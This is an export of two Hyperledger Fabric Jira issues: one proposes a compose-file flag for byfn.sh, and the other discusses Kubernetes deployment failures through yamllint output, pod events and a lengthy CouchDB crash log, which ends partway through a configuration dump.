use -f flag in byfn.sh to provide docker-compose.yaml file,FAB-5576,19888,,Story,Closed,FAB,Fabric,software,denyeart,,,Low,Done,dsanchezseco,dsanchezseco,dsanchezseco,02/Aug/17 9:33 PM,21/Jul/18 3:51 AM,28/Oct/23 3:00 AM,03/Aug/17 9:43 PM,v1.0.1,,,v1.0.2,,fabric-samples,,,,,,1,Usability,,,,,,"Provide the byfn.sh script with a new flag, -f, to receive the name of the docker-compose file to use in the form *byfn.sh -m up -c channel -f docker-compose-couch.yaml*.

This way the testing of the different environments is easier and standardized using the same script.",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,0,,0%,3600,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5603,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-2276,,,,,,,,,"1|hzx26f:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"03/Aug/17 6:51 PM;mastersingh24;[~dsanchezseco] - Great idea.  Please do make sure that you set a default to the current compose file as well;;;","03/Aug/17 6:58 PM;dsanchezseco;[~mastersingh24] sure, i have the code already, but i'm struggling to submit it;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support Kubernetes,FAB-5578,19892,16442,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Highest,Won't Do,greg.haskins,greg.haskins,greg.haskins,02/Aug/17 10:31 PM,09/Apr/19 5:46 PM,28/Oct/23 3:00 AM,09/Apr/19 5:46 PM,,,,Future,,,,,,,,2,,,,,,,,,daijianw,greg.haskins,harsha544,indirajith,mastersingh24,mffrench,mrkiouak,qiang0723,rblaine95,seokm0,soccerhaotian,Udossohn,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzybnr:",,,,,,,,,,,,,,,,,,,,,,,daijianw,greg.haskins,harsha544,indirajith,mastersingh24,mffrench,mrkiouak,qiang0723,rblaine95,seokm0,soccerhaotian,Udossohn,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Aug/17 3:47 AM;harsha544;make kubernetes passes through and later when I have issued *kubectl create --f- build/kubernetes.yaml --save-config* it fails with following error message on screen :
 *error: error converting YAML to JSON: yaml: line 8: could not find expected ':'*

Further investigation with yamllint yields following information :-

yamllint ./build/kubernetes.yaml -f parsable
 ./build/kubernetes.yaml:4:81: [error] line too long (89 > 80 characters) (line-length)
 ./build/kubernetes.yaml:6:81: [error] line too long (90 > 80 characters) (line-length)
 ./build/kubernetes.yaml:7:81: [error] line too long (87 > 80 characters) (line-length)
 ./build/kubernetes.yaml:8:81: [error] line too long (88 > 80 characters) (line-length)
 ./build/kubernetes.yaml:9:81: [error] line too long (86 > 80 characters) (line-length)
 ./build/kubernetes.yaml:10:81: [error] line too long (89 > 80 characters) (line-length)
 ./build/kubernetes.yaml:11:81: [error] line too long (90 > 80 characters) (line-length)
 ./build/kubernetes.yaml:14:81: [error] line too long (81 > 80 characters) (line-length)
 ./build/kubernetes.yaml:15:81: [error] line too long (88 > 80 characters) (line-length)
 ./build/kubernetes.yaml:16:81: [error] line too long (83 > 80 characters) (line-length)
 ./build/kubernetes.yaml:20:81: [error] line too long (87 > 80 characters) (line-length)
 ./build/kubernetes.yaml:21:81: [error] line too long (86 > 80 characters) (line-length)
 ./build/kubernetes.yaml:24:81: [error] line too long (83 > 80 characters) (line-length)
 ./build/kubernetes.yaml:25:81: [error] line too long (84 > 80 characters) (line-length)
 ./build/kubernetes.yaml:38:81: [error] line too long (90 > 80 characters) (line-length)
 ./build/kubernetes.yaml:39:81: [error] line too long (81 > 80 characters) (line-length)
 ./build/kubernetes.yaml:41:81: [error] line too long (82 > 80 characters) (line-length)
 ./build/kubernetes.yaml:59:81: [error] line too long (90 > 80 characters) (line-length)
 *./build/kubernetes.yaml:61:1: [error] syntax error: could not found expected ':'*
 ./build/kubernetes.yaml:134:81: [error] line too long (90 > 80 characters) (line-length)
 ./build/kubernetes.yaml:506:81: [error] line too long (90 > 80 characters) (line-length)
 ./build/kubernetes.yaml:767:81: [error] line too long (90 > 80 characters) (line-length)
 ./build/kubernetes.yaml:950:81: [error] line too long (90 > 80 characters) (line-length)
 ./build/kubernetes.yaml:1133:81: [error] line too long (90 > 80 characters) (line-length)
 ./build/kubernetes.yaml:1316:81: [error] line too long (90 > 80 characters) (line-length)
 ./build/kubernetes.yaml:1498:81: [error] line too long (90 > 80 characters) (line-length)
 ./build/kubernetes.yaml:1608:81: [error] line too long (139 > 80 characters) (line-length)
 ./build/kubernetes.yaml:1682:81: [error] line too long (96 > 80 characters) (line-length)
 ./build/kubernetes.yaml:1777:81: [error] line too long (116 > 80 characters) (line-length)
 ./build/kubernetes.yaml:1864:81: [error] line too long (105 > 80 characters) (line-length)
 ./build/kubernetes.yaml:1990:81: [error] line too long (105 > 80 characters) (line-length)
 ./build/kubernetes.yaml:2116:81: [error] line too long (105 > 80 characters) (line-length)
 ./build/kubernetes.yaml:2242:81: [error] line too long (105 > 80 characters) (line-length)
 ./build/kubernetes.yaml:2295:1: [error] trailing spaces (trailing-spaces)
 ./build/kubernetes.yaml:2298:1: [error] trailing spaces (trailing-spaces)
 ./build/kubernetes.yaml:2301:1: [error] trailing spaces (trailing-spaces)
 ./build/kubernetes.yaml:2303:1: [error] trailing spaces (trailing-spaces)
 ./build/kubernetes.yaml:2305:81: [error] line too long (110 > 80 characters) (line-length)
 ./build/kubernetes.yaml:2306:81: [error] line too long (126 > 80 characters) (line-length)
 ./build/kubernetes.yaml:2307:1: [error] trailing spaces (trailing-spaces)
 ./build/kubernetes.yaml:2309:81: [error] line too long (136 > 80 characters) (line-length)
 ./build/kubernetes.yaml:2311:1: [error] trailing spaces (trailing-spaces)
 ./build/kubernetes.yaml:2317:1: [error] trailing spaces (trailing-spaces)
 ./build/kubernetes.yaml:2324:1: [error] trailing spaces (trailing-spaces)
 ./build/kubernetes.yaml:2331:1: [error] trailing spaces (trailing-spaces)
 ./build/kubernetes.yaml:2332:81: [error] line too long (90 > 80 characters) (line-length)
 ./build/kubernetes.yaml:2334:1: [error] trailing spaces (trailing-spaces)
 ./build/kubernetes.yaml:2371:81: [error] line too long (109 > 80 characters) (line-length)
 ./build/kubernetes.yaml:2393:81: [error] line too long (93 > 80 characters) (line-length);;;","08/Aug/17 4:57 AM;greg.haskins;Interesting.  This all works for me on openshift origin v1.5.1.  I wonder if there is a kubernetes version issue.  Ill see what I can do.;;;","16/Aug/17 5:43 PM;harsha544;If it helps, the K8 version that I was making use of is v1.7.3.;;;","16/Aug/17 11:44 PM;rblaine95;After running _kubectl create --f- build/kubernetes.yaml --save-config_ I get this error:  
{code:java}
$ kubectl create -f build/kubernetes.yaml --save-config
 error: error converting YAML to JSON: yaml: line 8: could not find expected ':'{code}

I'm running this on a local _oc cluster up_ on Arch Linux.
{code:java}
$ oc version

oc v3.6.0+c4dd4cf
kubernetes v1.6.1+5115d708d7
features: Basic-Auth GSSAPI Kerberos SPNEGO

Server https://127.0.0.1:8443
openshift v3.6.0+c4dd4cf
kubernetes v1.6.1+5115d708d7
{code}

I tested [fabric-v1.0.0|https://github.com/chawlanikhil24/hyperledger-fabric-k8s] referenced in [this|https://jira.hyperledger.org/browse/CE-72] Jira ticket. Deployment works fine (just need to unrestrict the restricted scc, create a useroot account on openshift that has anyuid scc assigned to it, and give the pods the `serviceAccountName: useroot` flag before deploying) but the tests fail (probably due to routes or something, haven't gotten that far in the testing yet)

*Edit:* Figured out the issue, the _config.tgz_ hashes weren't being read as a single line, using Atom with multi-cursor package and deleting the end-lines of every. single. config.tgz hash so the hash is on a single line fixed it.
All but peer pods deploy, error in OpenShift is about Security Context Constraints.

*Edit:* Opened up the Restricted SCC
Set the image version numbers in kubernetes.yaml from latest to x86_64-1.0.1 to fix image pulling errors.
All pods are deploying, but the peer/couchdb pods keep crashing.


{code:java}
$ oc describe pod peer1-886879254-pg2td

{snip}
Events:
  FirstSeen	LastSeen	Count	From			SubObjectPath			Type		Reason		Message
  ---------	--------	-----	----			-------------			--------	------		-------
  2m		2m		1	default-scheduler					Normal		Scheduled	Successfully assigned peer1-886879254-pg2td to localhost
  2m		2m		1	kubelet, localhost	spec.containers{peer1}		Normal		Pulling		pulling image ""hyperledger/fabric-peer:x86_64-1.0.1""
  2m		2m		1	kubelet, localhost	spec.containers{peer1}		Normal		Pulled		Successfully pulled image ""hyperledger/fabric-peer:x86_64-1.0.1""
  2m		2m		1	kubelet, localhost	spec.containers{peer1}		Normal		Created		Created container
  2m		2m		1	kubelet, localhost	spec.containers{peer1}		Normal		Started		Started container
  2m		2m		3	kubelet, localhost	spec.containers{couchdb1}	Normal		Pulled		Container image ""hyperledger/fabric-couchdb:x86_64-1.0.1"" already present on machine
  2m		2m		3	kubelet, localhost	spec.containers{couchdb1}	Normal		Created		Created container
  2m		2m		3	kubelet, localhost	spec.containers{couchdb1}	Normal		Started		Started container
  1m		1m		1	kubelet, localhost	spec.containers{peer1}		Warning		Unhealthy	Liveness probe failed: dial tcp 172.17.0.4:7051: getsockopt: connection refused
  2m		1m		3	kubelet, localhost	spec.containers{peer1}		Warning		Unhealthy	Readiness probe failed: dial tcp 172.17.0.4:7051: getsockopt: connection refused
  2m		1m		4	kubelet, localhost	spec.containers{couchdb1}	Warning		BackOff		Back-off restarting failed container
  2m		1m		4	kubelet, localhost					Warning		FailedSync	Error syncing pod
{code}
;;;","17/Aug/17 5:49 PM;rblaine95;CouchDB1 Logs:
{code:java}
****************************************************
WARNING: CouchDB is running in Admin Party mode.
         This will allow anyone with access to the
         CouchDB port to access your database. In
         Docker's default configuration, this is
         effectively any other container on the same
         system.
         Use ""-e COUCHDB_USER=admin -e COUCHDB_PASSWORD=password""
         to set it in ""docker run"".
****************************************************
Configuration Settings:
  [attachments] compressible_types=""text/*, application/javascript, application/json, application/xml, application/octet-stream""
  [attachments] compression_level=""8""
  [chttpd] backlog=""512""
  [chttpd] bind_address=""0.0.0.0""
  [chttpd] docroot=""./share/www""
  [chttpd] port=""5984""
  [chttpd] socket_options=""[{recbuf, 262144}, {sndbuf, 262144}, {nodelay, true}]""
  [cluster] n=""1""
  [cluster] q=""8""
  [compaction_daemon] check_interval=""300""
  [compaction_daemon] min_file_size=""131072""
  [cors] credentials=""false""
  [couch_httpd_auth] allow_persistent_cookies=""false""
  [couch_httpd_auth] auth_cache_size=""50""
  [couch_httpd_auth] authentication_db=""_users""
  [couch_httpd_auth] authentication_redirect=""/_utils/session.html""
  [couch_httpd_auth] iterations=""1000""
  [couch_httpd_auth] require_valid_user=""false""
  [couch_httpd_auth] timeout=""600""
  [couch_httpd_oauth] use_users_db=""false""
  [couch_peruser] delete_dbs=""false""
  [couch_peruser] enable=""false""
  [couchdb] attachment_stream_buffer_size=""4096""
  [couchdb] database_dir=""/var/couchdb/data/""
  [couchdb] default_security=""admin_local""
  [couchdb] delayed_commits=""true""
  [couchdb] file_compression=""snappy""
  [couchdb] max_dbs_open=""8000""
  [couchdb] max_document_size=""67108864""
  [couchdb] os_process_timeout=""5000""
  [couchdb] uri_file=""/var/couchdb/data/couch.uri""
  [couchdb] view_index_dir=""/var/couchdb/data/""
  [csp] enable=""true""
  [daemons] auth_cache=""{couch_auth_cache, start_link, []}""
  [daemons] compaction_daemon=""{couch_compaction_daemon, start_link, []}""
  [daemons] couch_peruser=""{couch_peruser, start_link, []}""
  [daemons] external_manager=""{couch_external_manager, start_link, []}""
  [daemons] httpd=""{couch_httpd, start_link, []}""
  [daemons] index_server=""{couch_index_server, start_link, []}""
  [daemons] os_daemons=""{couch_os_daemons, start_link, []}""
  [daemons] query_servers=""{couch_proc_manager, start_link, []}""
  [daemons] uuids=""{couch_uuids, start, []}""
  [daemons] vhosts=""{couch_httpd_vhost, start_link, []}""
  [database_compaction] checkpoint_after=""5242880""
  [database_compaction] doc_buffer_size=""524288""
  [httpd] allow_jsonp=""false""
  [httpd] authentication_handlers=""{couch_httpd_oauth, oauth_authentication_handler}, {couch_httpd_auth, cookie_authentication_handler}, {couch_httpd_auth, default_authentication_handler}""
  [httpd] bind_address=""127.0.0.1""
  [httpd] default_handler=""{couch_httpd_db, handle_request}""
  [httpd] enable_cors=""false""
  [httpd] port=""5986""
  [httpd] secure_rewrites=""true""
  [httpd] socket_options=""[{recbuf, 262144}, {sndbuf, 262144}]""
  [httpd] vhost_global_handlers=""_utils, _uuids, _session, _oauth, _users""
  [httpd_db_handlers] _all_docs=""{couch_mrview_http, handle_all_docs_req}""
  [httpd_db_handlers] _changes=""{couch_httpd_db, handle_db_changes_req}""
  [httpd_db_handlers] _compact=""{couch_httpd_db, handle_compact_req}""
  [httpd_db_handlers] _design=""{couch_httpd_db, handle_design_req}""
  [httpd_db_handlers] _design_docs=""{couch_mrview_http, handle_design_docs_req}""
  [httpd_db_handlers] _local_docs=""{couch_mrview_http, handle_local_docs_req}""
  [httpd_db_handlers] _temp_view=""{couch_mrview_http, handle_temp_view_req}""
  [httpd_db_handlers] _view_cleanup=""{couch_mrview_http, handle_cleanup_req}""
  [httpd_design_handlers] _compact=""{couch_mrview_http, handle_compact_req}""
  [httpd_design_handlers] _info=""{couch_mrview_http, handle_info_req}""
  [httpd_design_handlers] _list=""{couch_mrview_show, handle_view_list_req}""
  [httpd_design_handlers] _rewrite=""{couch_httpd_rewrite, handle_rewrite_req}""
  [httpd_design_handlers] _show=""{couch_mrview_show, handle_doc_show_req}""
  [httpd_design_handlers] _update=""{couch_mrview_show, handle_doc_update_req}""
  [httpd_design_handlers] _view=""{couch_mrview_http, handle_view_req}""
  [httpd_design_handlers] _view_changes=""{couch_mrview_http, handle_view_changes_req}""
  [httpd_global_handlers] /=""{couch_httpd_misc_handlers, handle_welcome_req, <<\""Welcome\"">>}""
  [httpd_global_handlers] _active_tasks=""{couch_httpd_misc_handlers, handle_task_status_req}""
  [httpd_global_handlers] _all_dbs=""{couch_httpd_misc_handlers, handle_all_dbs_req}""
  [httpd_global_handlers] _config=""{couch_httpd_misc_handlers, handle_config_req}""
  [httpd_global_handlers] _oauth=""{couch_httpd_oauth, handle_oauth_req}""
  [httpd_global_handlers] _plugins=""{couch_plugins_httpd, handle_req}""
  [httpd_global_handlers] _replicate=""{couch_replicator_httpd, handle_req}""
  [httpd_global_handlers] _restart=""{couch_httpd_misc_handlers, handle_restart_req}""
  [httpd_global_handlers] _session=""{couch_httpd_auth, handle_session_req}""
  [httpd_global_handlers] _stats=""{couch_stats_httpd, handle_stats_req}""
  [httpd_global_handlers] _system=""{chttpd_misc, handle_system_req}""
  [httpd_global_handlers] _utils=""{couch_httpd_misc_handlers, handle_utils_dir_req, \""./share/www\""}""
  [httpd_global_handlers] _uuids=""{couch_httpd_misc_handlers, handle_uuids_req}""
  [httpd_global_handlers] favicon.ico=""{couch_httpd_misc_handlers, handle_favicon_req, \""./share/www\""}""
  [indexers] couch_mrview=""true""
  [log] level=""debug""
  [log] writer=""stderr""
  [native_query_servers] query=""{mango_native_proc, start_link, []}""
  [query_server_config] os_process_limit=""25""
  [query_server_config] reduce_limit=""true""
  [query_servers] coffeescript=""./bin/couchjs ./share/server/main-coffee.js""
  [query_servers] javascript=""./bin/couchjs ./share/server/main.js""
  [replicator] connection_timeout=""30000""
  [replicator] http_connections=""20""
  [replicator] max_replication_retry_count=""10""
  [replicator] retries_per_request=""10""
  [replicator] socket_options=""[{keepalive, true}, {nodelay, false}]""
  [replicator] ssl_certificate_max_depth=""3""
  [replicator] start_delay=""0""
  [replicator] start_splay=""0""
  [replicator] verify_ssl_certificates=""false""
  [replicator] worker_batch_size=""500""
  [replicator] worker_processes=""4""
  [ssl] port=""6984""
  [uuids] algorithm=""sequential""
  [uuids] max_count=""1000""
  [vendor] name=""The Apache Software Foundation""
  [view_compaction] keyvalue_buffer_size=""2097152""
[debug] 2017-08-17T08:42:37.930684Z nonode@nohost <0.105.0> -------- Supervisor couch_log_sup started couch_log_monitor:start_link() at pid <0.108.0>
[debug] 2017-08-17T08:42:37.932406Z nonode@nohost <0.105.0> -------- Supervisor couch_log_sup started config_listener_mon:start_link(couch_log_sup, nil) at pid <0.109.0>
[info] 2017-08-17T08:42:37.932430Z nonode@nohost <0.7.0> -------- Application couch_log started on node nonode@nohost
[debug] 2017-08-17T08:42:37.933615Z nonode@nohost <0.113.0> -------- Supervisor folsom_sup started folsom_sample_slide_sup:start_link() at pid <0.114.0>
[debug] 2017-08-17T08:42:37.934661Z nonode@nohost <0.113.0> -------- Supervisor folsom_sup started folsom_meter_timer_server:start_link() at pid <0.115.0>
[debug] 2017-08-17T08:42:37.935688Z nonode@nohost <0.113.0> -------- Supervisor folsom_sup started folsom_metrics_histogram_ets:start_link() at pid <0.116.0>
[info] 2017-08-17T08:42:37.935835Z nonode@nohost <0.7.0> -------- Application folsom started on node nonode@nohost
[debug] 2017-08-17T08:42:37.959086Z nonode@nohost <0.120.0> -------- Supervisor couch_stats_sup started couch_stats_aggregator:start_link() at pid <0.121.0>
[debug] 2017-08-17T08:42:37.961394Z nonode@nohost <0.120.0> -------- Supervisor couch_stats_sup started couch_stats_process_tracker:start_link() at pid <0.171.0>
[info] 2017-08-17T08:42:37.961551Z nonode@nohost <0.7.0> -------- Application couch_stats started on node nonode@nohost
[info] 2017-08-17T08:42:37.961694Z nonode@nohost <0.7.0> -------- Application khash started on node nonode@nohost
[debug] 2017-08-17T08:42:37.965901Z nonode@nohost <0.176.0> -------- Supervisor couch_event_sup2 started couch_event_server:start_link() at pid <0.177.0>
[debug] 2017-08-17T08:42:37.967072Z nonode@nohost <0.179.0> -------- Supervisor couch_event_os_sup started config_listener_mon:start_link(couch_event_os_sup, nil) at pid <0.180.0>
[debug] 2017-08-17T08:42:37.967137Z nonode@nohost <0.176.0> -------- Supervisor couch_event_sup2 started couch_event_os_sup:start_link() at pid <0.179.0>
[info] 2017-08-17T08:42:37.967332Z nonode@nohost <0.7.0> -------- Application couch_event started on node nonode@nohost
[debug] 2017-08-17T08:42:37.972488Z nonode@nohost <0.184.0> -------- Supervisor ibrowse_sup started ibrowse:start_link() at pid <0.185.0>
[info] 2017-08-17T08:42:37.972643Z nonode@nohost <0.7.0> -------- Application ibrowse started on node nonode@nohost
[debug] 2017-08-17T08:42:37.975004Z nonode@nohost <0.190.0> -------- Supervisor ioq_sup started config_listener_mon:start_link(ioq_sup, nil) at pid <0.191.0>
[debug] 2017-08-17T08:42:37.976448Z nonode@nohost <0.190.0> -------- Supervisor ioq_sup started ioq:start_link() at pid <0.192.0>
[info] 2017-08-17T08:42:37.976586Z nonode@nohost <0.7.0> -------- Application ioq started on node nonode@nohost
[info] 2017-08-17T08:42:37.976718Z nonode@nohost <0.7.0> -------- Application mochiweb started on node nonode@nohost
[info] 2017-08-17T08:42:37.976836Z nonode@nohost <0.7.0> -------- Application oauth started on node nonode@nohost
[info] 2017-08-17T08:42:37.982584Z nonode@nohost <0.198.0> -------- Apache CouchDB 2.0.0 is starting.

[info] 2017-08-17T08:42:37.982652Z nonode@nohost <0.199.0> -------- Starting couch_sup
[debug] 2017-08-17T08:42:37.982827Z nonode@nohost <0.199.0> -------- Supervisor couch_sup started config_listener_mon:start_link(couch_sup, nil) at pid <0.200.0>
[debug] 2017-08-17T08:42:37.991983Z nonode@nohost <0.201.0> -------- Supervisor couch_primary_services started couch_drv:start_link() at pid <0.202.0>
[debug] 2017-08-17T08:42:37.993662Z nonode@nohost <0.201.0> -------- Supervisor couch_primary_services started couch_task_status:start_link() at pid <0.203.0>
[debug] 2017-08-17T08:42:37.998419Z nonode@nohost <0.201.0> -------- Supervisor couch_primary_services started couch_server:sup_start_link() at pid <0.204.0>
[debug] 2017-08-17T08:42:37.998494Z nonode@nohost <0.199.0> -------- Supervisor couch_sup started couch_primary_sup:start_link() at pid <0.201.0>
[debug] 2017-08-17T08:42:38.001130Z nonode@nohost <0.207.0> -------- Supervisor couch_secondary_services started gen_event:start_link({local,couch_plugin}) at pid <0.208.0>
[debug] 2017-08-17T08:42:38.003346Z nonode@nohost <0.207.0> -------- Supervisor couch_secondary_services started couch_proc_manager:start_link() at pid <0.209.0>
[debug] 2017-08-17T08:42:38.006049Z nonode@nohost <0.207.0> -------- Supervisor couch_secondary_services started couch_peruser:start_link() at pid <0.211.0>
[debug] 2017-08-17T08:42:38.012413Z nonode@nohost <0.207.0> -------- Supervisor couch_secondary_services started couch_index_server:start_link() at pid <0.212.0>
[notice] 2017-08-17T08:42:38.017081Z nonode@nohost <0.82.0> -------- config: [couchdb] uuid set to 5d605d084b9dba41a64fc93929813fe1 for reason nil
[error] 2017-08-17T08:42:38.018578Z nonode@nohost <0.82.0> -------- gen_server config terminated with reason: no match of right hand value {error,eacces} at config_writer:save_to_file/2(line:38) <= config:handle_call/3(line:222) <= gen_server:try_handle_call/4(line:629) <= gen_server:handle_msg/5(line:661) <= proc_lib:init_p_do_apply/3(line:240)
  last msg: {set,""couchdb"",""uuid"",""5d605d084b9dba41a64fc93929813fe1"",true,nil}
     state: {config,[],[""/opt/couchdb/bin/../etc/default.ini"",""/opt/couchdb/bin/../etc/local.ini"",""/opt/couchdb/bin/../etc/local.d/local.ini""],""/opt/couchdb/bin/../etc/local.d/local.ini""}
[error] 2017-08-17T08:42:38.020080Z nonode@nohost <0.82.0> -------- CRASH REPORT Process config (<0.82.0>) with 0 neighbors exited with reason: no match of right hand value {error,eacces} at config_writer:save_to_file/2(line:38) <= config:handle_call/3(line:222) <= gen_server:try_handle_call/4(line:629) <= gen_server:handle_msg/5(line:661) <= proc_lib:init_p_do_apply/3(line:240) at gen_server:terminate/7(line:826) <= proc_lib:init_p_do_apply/3(line:240); initial_call: {config,init,['Argument__1']}, ancestors: [config_sup,<0.80.0>], messages: [], links: [<0.81.0>], dictionary: [], trap_exit: false, status: running, heap_size: 6772, stack_size: 27, reductions: 82113
[error] 2017-08-17T08:42:38.020335Z nonode@nohost <0.81.0> -------- Supervisor config_sup had child config started with config:start_link([""/opt/couchdb/bin/../etc/default.ini"",""/opt/couchdb/bin/../etc/local.ini"",""/opt/couchdb/bin/../...""]) at <0.82.0> exit with reason no match of right hand value {error,eacces} at config_writer:save_to_file/2(line:38) <= config:handle_call/3(line:222) <= gen_server:try_handle_call/4(line:629) <= gen_server:handle_msg/5(line:661) <= proc_lib:init_p_do_apply/3(line:240) in context child_terminated
[error] 2017-08-17T08:42:38.020527Z nonode@nohost <0.207.0> -------- Supervisor couch_secondary_services had child httpd started with couch_httpd:start_link() at undefined exit with reason {'EXIT',{{{badmatch,{error,eacces}},[{config_writer,save_to_file,2,[{file,""src/config_writer.erl""},{line,38}]},{config,handle_call,3,[{file,""src/config.erl""},{line,222}]},{gen_server,try_handle_call,4,[{file,""gen_server.erl""},{line,629}]},{gen_server,handle_msg,5,[{file,""gen_server.erl""},{line,661}]},{proc_lib,init_p_do_apply,3,[{file,""proc_lib.erl""},{line,240}]}]},{gen_server,call,[config,{set,""couchdb"",""uuid"",""5d605d084b9dba41a64fc93929813fe1"",true,nil}]}}} in context start_error
[error] 2017-08-17T08:42:38.020768Z nonode@nohost <0.199.0> -------- Supervisor couch_sup had child couch_secondary_services started with couch_secondary_sup:start_link() at undefined exit with reason {shutdown,{failed_to_start_child,httpd,{'EXIT',{{{badmatch,{error,eacces}},[{config_writer,save_to_file,2,[{file,""src/config_writer.erl""},{line,38}]},{config,handle_call,3,[{file,""src/config.erl""},{line,222}]},{gen_server,try_handle_call,4,[{file,""gen_server.erl""},{line,629}]},{gen_server,handle_msg,5,[{file,""gen_server.erl""},{line,661}]},{proc_lib,init_p_do_apply,3,[{file,""proc_lib.erl""},{line,240}]}]},{gen_server,call,[config,{set,""couchdb"",""uuid"",""5d605d084b9dba41a64fc93929813fe1"",true,nil}]}}}}} in context start_error
[error] 2017-08-17T08:42:38.021063Z nonode@nohost <0.198.0> -------- Error starting Apache CouchDB:

    {error,{shutdown,{failed_to_start_child,couch_secondary_services,{shutdown,{failed_to_start_child,httpd,{'EXIT',{{{badmatch,{error,eacces}},[{config_writer,save_to_file,2,[{file,""src/config_writer.erl""},{line,38}]},{config,handle_call,3,[{file,""src/config.erl""},{line,222}]},{gen_server,try_handle_call,4,[{file,""gen_server.erl""},{line,629}]},{gen_server,handle_msg,5,[{file,""gen_server.erl""},{line,661}]},{proc_lib,init_p_do_apply,3,[{file,""proc_lib.erl""},{line,240}]}]},{gen_server,call,[config,{set,""couchdb"",""uuid"",""5d605d084b9dba41a64fc93929813fe1"",true,nil}]}}}}}}}}


[error] 2017-08-17T08:42:38.021270Z nonode@nohost <0.197.0> -------- CRASH REPORT Process  (<0.197.0>) with 0 neighbors exited with reason: {{shutdown,{failed_to_start_child,couch_secondary_services,{shutdown,{failed_to_start_child,httpd,{'EXIT',{{{badmatch,{error,eacces}},[{config_writer,save_to_file,2,[{file,""src/config_writer.erl""},{line,38}]},{config,handle_call,3,[{file,""src/config.erl""},{line,222}]},{gen_server,try_handle_call,4,[{file,""gen_server.erl""},{line,629}]},{gen_server,handle_msg,5,[{file,""gen_server.erl""},{line,661}]},{proc_lib,init_p_do_apply,3,[{file,""proc_lib.erl""},{line,240}]}]},{gen_server,call,[config,{set,...}]}}}}}}},...} at application_master:init/4(line:134) <= proc_lib:init_p_do_apply/3(line:240); initial_call: {application_master,init,['Argument__1','Argument__2',...]}, ancestors: [<0.196.0>], messages: [{'EXIT',<0.198.0>,normal}], links: [<0.196.0>,<0.7.0>], dictionary: [], trap_exit: true, status: running, heap_size: 987, stack_size: 27, reductions: 151
[info] 2017-08-17T08:42:38.021582Z nonode@nohost <0.7.0> -------- Application couch exited with reason: {{shutdown,{failed_to_start_child,couch_secondary_services,{shutdown,{failed_to_start_child,httpd,{'EXIT',{{{badmatch,{error,eacces}},[{config_writer,save_to_file,2,[{file,""src/config_writer.erl""},{line,38}]},{config,handle_call,3,[{file,""src/config.erl""},{line,222}]},{gen_server,try_handle_call,4,[{file,""gen_server.erl""},{line,629}]},{gen_server,handle_msg,5,[{file,""gen_server.erl""},{line,661}]},{proc_lib,init_p_do_apply,3,[{file,""proc_lib.erl""},{line,240}]}]},{gen_server,call,[config,{set,...}]}}}}}}},...}
Configuration Settings:
  [attachments] compressible_types=""text/*, application/javascript, application/json, application/xml, application/octet-stream""
  [attachments] compression_level=""8""
  [chttpd] backlog=""512""
  [chttpd] bind_address=""0.0.0.0""
  [chttpd] docroot=""./share/www""
  [chttpd] port=""5984""
  [chttpd] socket_options=""[{recbuf, 262144}, {sndbuf, 262144}, {nodelay, true}]""
  [cluster] n=""1""
  [cluster] q=""8""
  [compaction_daemon] check_interval=""300""
  [compaction_daemon] min_file_size=""131072""
  [cors] credentials=""false""
  [couch_httpd_auth] allow_persistent_cookies=""false""
  [couch_httpd_auth] auth_cache_size=""50""
  [couch_httpd_auth] authentication_db=""_users""
  [couch_httpd_auth] authentication_redirect=""/_utils/session.html""
  [couch_httpd_auth] iterations=""1000""
  [couch_httpd_auth] require_valid_user=""false""
  [couch_httpd_auth] timeout=""600""
  [couch_httpd_oauth] use_users_db=""false""
  [couch_peruser] delete_dbs=""false""
  [couch_peruser] enable=""false""
  [couchdb] attachment_stream_buffer_size=""4096""
  [couchdb] database_dir=""/var/couchdb/data/""
  [couchdb] default_security=""admin_local""
  [couchdb] delayed_commits=""true""
  [couchdb] file_compression=""snappy""
  [couchdb] max_dbs_open=""8000""
  [couchdb] max_document_size=""67108864""
  [couchdb] os_process_timeout=""5000""
  [couchdb] uri_file=""/var/couchdb/data/couch.uri""
  [couchdb] view_index_dir=""/var/couchdb/data/""
  [csp] enable=""true""
  [daemons] auth_cache=""{couch_auth_cache, start_link, []}""
  [daemons] compaction_daemon=""{couch_compaction_daemon, start_link, []}""
  [daemons] couch_peruser=""{couch_peruser, start_link, []}""
  [daemons] external_manager=""{couch_external_manager, start_link, []}""
  [daemons] httpd=""{couch_httpd, start_link, []}""
  [daemons] index_server=""{couch_index_server, start_link, []}""
  [daemons] os_daemons=""{couch_os_daemons, start_link, []}""
  [daemons] query_servers=""{couch_proc_manager, start_link, []}""
  [daemons] uuids=""{couch_uuids, start, []}""
  [daemons] vhosts=""{couch_httpd_vhost, start_link, []}""
  [database_compaction] checkpoint_after=""5242880""
  [database_compaction] doc_buffer_size=""524288""
  [httpd] allow_jsonp=""false""
  [httpd] authentication_handlers=""{couch_httpd_oauth, oauth_authentication_handler}, {couch_httpd_auth, cookie_authentication_handler}, {couch_httpd_auth, default_authentication_handler}""
  [httpd] bind_address=""127.0.0.1""
  [httpd] default_handler=""{couch_httpd_db, handle_request}""
  [httpd] enable_cors=""false""
  [httpd] port=""5986""
  [httpd] secure_rewrites=""true""
